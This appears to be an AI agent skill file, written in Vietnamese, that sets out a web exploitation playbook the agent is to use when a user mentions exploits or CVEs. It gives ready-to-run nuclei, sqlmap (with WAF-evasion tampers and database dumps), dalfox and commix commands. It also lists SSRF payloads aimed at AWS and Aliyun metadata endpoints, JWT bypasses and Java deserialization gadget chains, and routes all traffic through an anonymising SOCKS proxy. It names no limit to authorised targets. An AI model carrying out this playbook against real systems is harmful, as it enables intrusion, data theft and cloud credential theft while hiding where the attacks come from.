---
name: redteam-attack
description: Khai thác web — SQLi/XSS/RCE/SSRF/deser/CVE chaining, tất cả qua proxy. Dùng khi user nói "exploit", "khai thác", "RCE", "SQLi", "bypass", "test vuln", hoặc nêu 1 CVE cụ thể. Tích hợp nuclei + sqlmap + dalfox + commix + săn PoC TQ.
---

# ⚔️ RedTeam-Attack — Exploitation Chain

**Tools chạy DIRECT (không proxy)** — config 2026-07-11. Workflow `attack-chain.ps1` không truyền `--proxy`.
Muốn route qua SOCKS5h: nuclei/dalfox honor env `HTTP_PROXY`; sqlmap/commix cần flag `--proxy socks5h://...`.

## Workflow tự động
```powershell
.\workflows\attack-chain.ps1 -Url https://t.com -Full      # nuclei+sqlmap+xss+rce
.\workflows\attack-chain.ps1 -Url 'https://t.com/item?id=1' -Sqlmap -Param id
.\workflows\attack-chain.ps1 -Url https://t.com -Commix -Data 'cmd=ping'
```

## Lớp tấn công (theo impact, cao→thấp)

### 1. Known CVE / exposure → `nuclei` (templates cập nhật liên tục)
```
nuclei -u <url> -severity critical,high,medium -proxy socks5://... -rl 30
nuclei -u <url> -t exposures/ -t cves/ -t default-logins/
```
Hit nuclei → tra CVE bằng skill **cn-0day-hunt** (writeup TQ + PoC + gadget).
Đối chiếu `searchsploit "<keyword>"`.

### 2. SQL Injection → `sqlmap` (proxy flag)
```
sqlmap -u '<url>?id=1' -p id --proxy socks5h://... --batch --level=3 --risk=2 \
       --random-agent --threads=5 --flush-session
# WAF: --tamper=space2comment,between --randomize --delay=2
# POST: --data 'user=a&pass=b' ; dump: --dbs --current-db --dump
```
Test mọi param tìm được từ skill redteam-fuzz. JSON body: `--data '{"id":1}' --content-type`.

### 3. XSS → `dalfox`
```
dalfox url <url> -p <param> --proxy socks5://... --only-poc r
```

### 4. OS Command Injection / RCE → `commix`
```
commix --url '<url>?cmd=ping' --data 'x=1' --proxy socks5h://... --batch
```

### 5. Deserialization (Java) — dominant ở stacks TQ
- **Fastjson** autotype RCE, **Shiro** (default key + gadget), **Spring** (Cloud Function SpEL),
  **Weblogic** (T3/IIOP), **log4shell**, **Jenkins/XStream**, **OFBiz**, **ShenYu/APISIX/Dubbo**.
- Gadgets local: `D:\Security Research\phpggc` (PHP), ysoserial (Java — cài qua skill nếu cần).
- **Săn chain mới**: skill `cn-0day-hunt` — cộng đồng TQ publish deser chain nhanh nhất.

### 6. SSRF → IMDS / internal pivot
Param nhận URL (`url=`, `file=`, `target=`, `host=`) →
`http://169.254.169.254/latest/meta-data/` (AWS), `http://100.100.100.200/...` (Aliyun),
gopher:// (CRLF→Redis/FastCGI), file:// (read). Via proxy vẫn work (ssrf là server-side).

### 7. Auth bypass / IDOR / logic
- IDOR: `?id=1→2→3` (forcebrowse từ recon).
- JWT: `alg:none`, weak secret (hashcat -m 16500), kid injection.
- BOLA / mass-assignment.

## Rigor (từ memory `vuln-confirmation-rigor`)
- **default ≠ vuln**: config/stack phải thực sự kích hoạt sink.
- **novelty trước severity**: authed-RCE/bypass phải chứng minh NOVEL (xem `[[langflow-agentic-ast-bypass]]`).
- CONFIRMED cần PoC chạy được đến sink (`<poc_simulation>`). Không fabricate.

## Proxy reminder
Mọi curl/request qua `socks5h://4g:...@unixy.xn--lun-lna.vn:10800 -k`.
sqlmap/commix: `--proxy` flag. nuclei/dalfox: env tự lo.
